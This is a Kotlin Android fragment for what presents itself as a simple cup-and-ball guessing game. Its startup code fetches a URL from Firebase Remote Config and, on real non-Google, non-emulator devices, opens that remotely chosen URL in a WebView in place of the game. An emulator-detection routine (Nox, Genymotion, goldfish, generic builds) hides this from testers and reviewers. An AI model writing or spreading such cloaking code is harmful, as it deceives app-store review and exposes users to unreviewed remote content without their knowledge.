package fspotis.gallacto

import android.os.Build
import android.os.Bundle
import android.os.CountDownTimer
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.ImageView
import android.widget.RelativeLayout
import android.widget.TextView
import androidx.core.view.isVisible
import androidx.core.view.marginBottom
import androidx.core.view.marginLeft
import androidx.core.view.marginRight
import androidx.core.view.marginTop
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.daimajia.androidanimations.library.BuildConfig
import com.daimajia.androidanimations.library.Techniques
import com.daimajia.androidanimations.library.YoYo
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import java.util.Locale
import kotlin.random.Random

class MainFragment : Fragment() {


    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        val view = inflater.inflate(R.layout.main_fragment, container, false)
        var rnd = 0
        var points = 0
        val leftCup = view.findViewById<ImageView>(R.id.leftCup)
        val middleCup = view.findViewById<ImageView>(R.id.middleCup)
        val rightCup = view.findViewById<ImageView>(R.id.rightCup)
        val startButton = view.findViewById<Button>(R.id.startGameButton)
        var params = RelativeLayout.LayoutParams(140, 140)
        val ball = view.findViewById<ImageView>(R.id.ball)
        val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.fetchAndActivate().addOnCompleteListener() { task ->
            if (task.isSuccessful) {
                val url = remoteConfig.getString("url")
                val urlBundle = Bundle()
                urlBundle.putString("URL", url)
                val deviceMan = Build.MANUFACTURER

                if (url.isNotEmpty() && !deviceMan.equals("Google") && !checkIsEmu()) {
                    findNavController().navigate(
                        R.id.action_mainFragment_to_fragmentWebView,
                        urlBundle
                    )
                } else {
                    view.isVisible= true
                    startButton.setOnClickListener {

                        val timer = object : CountDownTimer(2000, 1000) {
                            override fun onTick(millisUntilFinished: Long) {
                                ball.visibility = View.VISIBLE
                                rnd = Random.nextInt(1, 4)
                                startButton.visibility = View.INVISIBLE
                                params.setMargins(
                                    middleCup.marginLeft + 450,
                                    middleCup.marginTop + 200,
                                    middleCup.marginRight,
                                    middleCup.marginBottom
                                )
                                ball.layoutParams = params

                                YoYo.with(Techniques.BounceInDown)
                                    .duration(1000)
                                    .repeat(1)
                                    .playOn(middleCup)


                                view.findViewById<TextView>(R.id.points).text = points.toString()
                            }

                            override fun onFinish() {
                                YoYo.with(Techniques.SlideInLeft)
                                    .duration(1000)
                                    .repeat(5)
                                    .playOn(middleCup)

                                YoYo.with(Techniques.SlideInLeft)
                                    .duration(1000)
                                    .repeat(5)
                                    .playOn(rightCup)

                                YoYo.with(Techniques.SlideInRight)
                                    .duration(1000)
                                    .repeat(5)
                                    .playOn(leftCup)
                                ball.visibility = View.INVISIBLE

                            }
                        }
                        timer.start()
                    }



                    leftCup.setOnClickListener {
                        if (rnd == 1) {
                            ball.visibility = View.VISIBLE
                            params = RelativeLayout.LayoutParams(140, 140)
                            params.setMargins(
                                leftCup.marginLeft + 100,
                                leftCup.marginTop + 200,
                                leftCup.marginRight,
                                leftCup.marginBottom
                            )
                            ball.layoutParams = params
                            points++
                            YoYo.with(Techniques.BounceInDown)
                                .duration(700)
                                .repeat(1)
                                .playOn(leftCup)

                            startButton.visibility = View.VISIBLE
                        } else {
                            YoYo.with(Techniques.Shake)
                                .duration(700)
                                .repeat(1)
                                .playOn(leftCup)

                            startButton.visibility = View.VISIBLE
                        }
                    }

                    middleCup.setOnClickListener {
                        if (rnd == 2) {

                            ball.visibility = View.VISIBLE
                            params.setMargins(
                                middleCup.marginLeft + 450,
                                middleCup.marginTop + 200,
                                middleCup.marginRight,
                                middleCup.marginBottom
                            )
                            ball.layoutParams = params
                            points++
                            YoYo.with(Techniques.BounceInDown)
                                .duration(700)
                                .repeat(1)
                                .playOn(middleCup)

                            startButton.visibility = View.VISIBLE
                        } else {

                            Thread.sleep(500)
                            YoYo.with(Techniques.Shake)
                                .duration(700)
                                .repeat(1)
                                .playOn(middleCup)

                            startButton.visibility = View.VISIBLE
                        }

                    }

                    rightCup.setOnClickListener {
                        if (rnd == 3) {

                            ball.visibility = View.VISIBLE
                            params = RelativeLayout.LayoutParams(140, 140)
                            params.setMargins(
                                leftCup.marginLeft + 800,
                                leftCup.marginTop + 200,
                                leftCup.marginRight,
                                leftCup.marginBottom
                            )
                            ball.layoutParams = params

                            YoYo.with(Techniques.BounceInDown)
                                .duration(700)
                                .repeat(1)
                                .playOn(rightCup)

                            points++
                            startButton.visibility = View.VISIBLE
                        } else {

                            YoYo.with(Techniques.Shake)
                                .duration(700)
                                .repeat(1)
                                .playOn(rightCup)
                            startButton.visibility = View.VISIBLE
                        }

                    }

                }
            }
        }
        return view
    }

    private fun checkIsEmu(): Boolean {
        if (BuildConfig.DEBUG) return false // when developer use this build on emulator

        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand = Build.BRAND;


        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))

        if (result) return true
        result =
            result or (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    }
}